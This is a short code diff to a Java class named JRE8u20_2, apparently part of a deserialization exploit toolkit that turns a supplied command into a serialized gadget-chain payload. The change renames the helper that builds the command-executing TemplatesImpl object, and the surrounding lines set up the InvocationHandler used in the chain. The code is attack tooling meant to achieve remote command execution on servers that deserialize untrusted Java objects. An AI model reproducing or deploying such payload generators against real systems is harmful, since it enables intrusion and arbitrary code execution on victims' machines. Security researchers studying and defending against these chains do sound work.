@@ -39,7 +39,7 @@ public class JRE8u20_2 implements CommandObjectPayload<Object>
 
 	@Override
 	public Object getObject(String command) throws Exception {
-		Object templates = Gadgets.createTemplatesImpl(command);
+		Object templates = Gadgets.createTemplates4Cmd(command);
 
 		Class       ihClass     = newInvocationHandlerClass();
 		Constructor constructor = ihClass.getDeclaredConstructor(Class.class, Map.class);
